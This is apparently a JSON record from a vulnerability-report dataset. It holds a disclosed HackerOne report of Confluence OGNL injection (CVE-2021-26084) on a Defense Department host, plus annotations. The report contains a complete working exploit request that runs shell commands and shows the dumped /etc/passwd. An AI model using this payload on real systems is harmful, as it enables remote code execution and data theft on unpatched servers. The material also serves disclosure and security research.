@@ -1,0 +1,45 @@
+{
+  "reported_to": "U.S. Dept Of Defense",
+  "reported_by": "fdeleite ",
+  "title": "RCE on \u2588\u2588\u2588\u2588\u2588\u2588\u2588 [CVE-2021-26084]",
+  "content": "\nIn affected versions of Confluence Server and Data Center, an OGNL injection vulnerability exists that would allow an authenticated user, and in some instances an unauthenticated user, to execute arbitrary code on a Confluence Server or Data Center instance. The vulnerable endpoints can be accessed by a non-administrator user or unauthenticated user if \u2018Allow people to sign up to create their account\u2019 is enabled. To check whether this is enabled go to COG > User Management > User Signup Options. The affected versions are before version 6.13.23, from version 6.14.0 before 7.4.11, from version 7.5.0 before 7.11.6, and from version 7.12.0\nImpact\nAn unauthenticated, 3rd-party attacker or adversary can execute remote code\nSystem Host(s)\n\u2588\u2588\u2588\u2588\u2588\nAffected Product(s) and Version(s)\nCVE-2021-26084\nCVE Numbers\nSteps to Reproduce\nPOST\n(command cat /etc/passwd)\nCode 1.04 KiB\n1POST /pages/createpage-entervariables.action?SpaceKey=x HTTP/1.1\n2Host: \u2588\u2588\u2588\n3Content-Type: application/x-www-form-urlencoded\n4Content-Length: 915\n5\n6queryString=aaaaaaaa\\u0027%2b{Class.forName(\\u0027javax.script.ScriptEngineManager\\u0027).newInstance().getEngineByName(\\u0027JavaScript\\u0027).\\u0065val(\\u0027var+isWin+%3d+java.lang.System.getProperty(\\u0022os.name\\u0022).toLowerCase().contains(\\u0022win\\u0022)%3b+var+cmd+%3d+new+java.lang.String(\\u0022cat /etc/passwd\\u0022)%3bvar+p+%3d+new+java.lang.ProcessBuilder()%3b+if(isWin){p.command(\\u0022cmd.exe\\u0022,+\\u0022/c\\u0022,+cmd)%3b+}+else{p.command(\\u0022bash\\u0022,+\\u0022-c\\u0022,+cmd)%3b+}p.redirectErrorStream(true)%3b+var+process%3d+p.start()%3b+var+inputStreamReader+%3d+new+java.io.InputStreamReader(process.getInputStream())%3b+var+bufferedReader+%3d+new+java.io.BufferedReader(inputStreamReader)%3b+var+line+%3d+\\u0022\\u0022%3b+var+output+%3d+\\u0022\\u0022%3b+while((line+%3d+bufferedReader.readLine())+!%3d+null){output+%3d+output+%2b+line+%2b+java.lang.Character.toString(10)%3b+}\\u0027)}%2b\\u0027\n7\nYou will see the output of the ifconfig command\nOUTPUT\nCode 1.08 KiB\n1      type=\"hidden\"\n2          name=\"queryString\"            value=\"aaaaaaaa[root:x:0:0:root:/root:/bin/bash\n3daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n4bin:x:2:2:bin:/bin:/usr/sbin/nologin\n5sys:x:3:3:sys:/dev:/usr/sbin/nologin\n6sync:x:4:65534:sync:/bin:/bin/sync\n7games:x:5:60:games:/usr/games:/usr/sbin/nologin\n8man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n9lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n10mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n11news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n12uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n13proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n14www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n15backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n16list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n17irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n18gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n19nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n20_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n21confluence:x:2002:2002::/var/atlassian/application-data/confluence:/bin/bash\n22]\"             />\n23        <input\nSuggested Mitigation/Remediation Actions\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "OS Command Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1703198640,
+  "report_url": "https://hackerone.com/reports/1327701",
+  "is_multi_component": false,
+  "complexity": "LOW",
+  "novelty": "LOW",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Send a POST request to the vulnerable endpoint /pages/createpage-entervariables.action?SpaceKey=x with a crafted queryString parameter containing OGNL injection payload."
+    ],
+    [
+      2,
+      "The payload executes arbitrary code (e.g., cat /etc/passwd) on the server, and the response includes the command output."
+    ]
+  ],
+  "vuln_description": "An OGNL injection vulnerability in Confluence Server and Data Center allows authenticated or unauthenticated users (if signup is enabled) to execute arbitrary code via crafted requests to vulnerable endpoints.",
+  "reason": "The attack involves crafting a complex OGNL injection payload and understanding the vulnerable endpoint. While the payload is intricate, the vulnerability itself is a known OGNL injection pattern, and the endpoint is straightforward to target once identified.",
+  "new_complexity": "MEDIUM",
+  "requires_code": false,
+  "requires_CVE": true,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The vulnerability involves an OGNL injection that allows arbitrary code execution, which is not directly related to the authentication or authorization bypass methodologies described. The detection methods focus on swapping user sessions or resource IDs within the same application context, not on code injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
